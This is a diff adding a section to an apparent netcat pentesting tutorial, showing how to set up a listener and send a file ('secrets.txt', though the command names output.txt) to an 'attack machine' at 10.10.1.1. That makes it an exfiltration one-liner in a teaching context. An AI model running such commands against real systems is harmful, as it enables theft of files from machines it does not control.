@@ -81,3 +81,29 @@ When someone connects, the terminal reads something like the following:
 `Connection received on 10.10.1.1 33032`
 
 From here, I can generate a stable shell.
+
+## Sending a File
+
+Netcat has the ability to also send files between machines. I will show how to receive and send a file using netcat. The syntax is very easy. In this example I am sending the secrets.txt to my attack machine that has an ip address of 10.10.1.1.
+
+### Receiver
+
+I need to setup the receiver first. Here is the syntax:
+
+`nc -lp 4444 -q 5 > output.txt < /dev/null`
+
+Here is a explaination about the command:
+
+- The `-l` option tells netcat to listen.
+- The `-p` option tells netcat what port to listen on. In this case 4444.
+- The `-q` option tells netcat to wait for 5 seconds after the EOF (end of file) is sent.
+- The `> output.txt` will save the text from netcat into the output.txt file.
+- The `< /dev/null` will send an EOF to the command since we don't want to provide any input from our side.
+
+### Sender
+
+The sending is even easier than the above command. Here is the syntax:
+
+`cat output.txt | nc 10.10.1.1 4444`
+
+Cat will grab the text in output.txt and send it to my attack machine on port 4444.
